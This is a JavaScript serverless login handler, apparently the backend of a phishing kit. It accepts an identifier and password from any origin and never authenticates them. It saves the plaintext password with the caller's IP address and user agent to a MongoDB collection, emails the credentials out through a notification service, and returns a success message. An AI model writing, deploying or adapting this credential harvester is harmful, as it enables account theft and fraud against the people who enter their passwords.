import mongoose from 'mongoose';
import { LoginAttempt } from '../../server/models/LoginAttempt.js';
import { sendLoginNotificationEmail } from '../../server/services/emailService.js';

let mongoConnected = false;

const connectDB = async () => {
  if (mongoConnected) return;
  
  try {
    await mongoose.connect(process.env.MONGODB_URI);
    mongoConnected = true;
    console.log('✓ Connecté à MongoDB');
  } catch (error) {
    console.error('✗ Erreur MongoDB:', error.message);
    throw error;
  }
};

export default async function handler(req, res) {
  // Activer CORS
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  // Gestion des requêtes OPTIONS (preflight)
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { identifiant, motDePasse } = req.body;

    console.log('📝 Tentative de connexion reçue:', { identifiant });

    if (!identifiant || !motDePasse) {
      return res.status(400).json({
        success: false,
        message: 'Identifiant et mot de passe sont requis',
      });
    }

    await connectDB();

    const ipAddress = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'inconnu';

    const loginAttempt = new LoginAttempt({
      identifiant,
      motDePasse,
      ipAddress,
      userAgent: req.headers['user-agent'],
    });

    await loginAttempt.save();
    console.log('✓ Tentative enregistrée:', loginAttempt._id);

    try {
      await sendLoginNotificationEmail(identifiant, motDePasse, ipAddress);
      console.log('✓ Email envoyé');
    } catch (emailError) {
      console.warn('⚠ Erreur email:', emailError.message);
    }

    res.status(201).json({
      success: true,
      message: 'Connexion enregistrée avec succès',
      id: loginAttempt._id,
    });
  } catch (error) {
    console.error('✗ Erreur serveur:', error.message);
    res.status(500).json({
      success: false,
      message: 'Erreur serveur lors de l\'enregistrement',
    });
  }
}
